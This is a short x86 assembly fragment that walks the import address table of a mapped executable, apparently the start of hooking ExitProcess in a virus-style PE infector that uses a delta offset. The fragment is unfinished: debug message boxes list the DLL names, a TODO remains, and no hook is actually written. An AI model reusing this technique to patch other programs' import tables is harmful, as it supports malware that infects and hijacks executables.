; IAT Hooking (ExitProcess)
; Check if valid
cmp	[DELTA OffsetIAT], 0
je	doNotHook
; Get IAT
mov	edi, ebx ; VA IAT
mov	eax, [DELTA OffsetIAT]
sub	edi, eax
mov	eax, [DELTA PeFileMap]
add	edi, eax ; IAT

; Iterate on all IAT Modules
iterateIAT:
mov	edx, edi
add	edx, 0Ch ; Dll Name
mov	edx, [edx] ; VA
cmp	edx, 0
je	doNotHook
add	edx, eax
mov	ecx, [DELTA OffsetIAT]
sub	edx, ecx

pusha
push	0
push	edx
push	edx
push	0
call	[DELTA pMessageBox]
popa

; Iterate on all Imported Functions
mov	edx, edi
mov	edx, [edx]
add	edx, eax
sub	edx, ecx
iterateFunc:
mov	ebx, [edx]
cmp	ebx, 0
je	endIterateFunc
add	ebx, eax
sub	ebx, ecx
add	ebx, 2 ; TODO - WHY !?

; pusha
; push	0
; push	ebx
; push	ebx
; push	0
; call	[DELTA pMessageBox]
; popa

add	edx, 4
jmp	iterateFunc

endIterateFunc:


add	edi, sizeof (IMAGE_IMPORT_DESCRIPTOR)
jmp	iterateIAT

doNotHook:
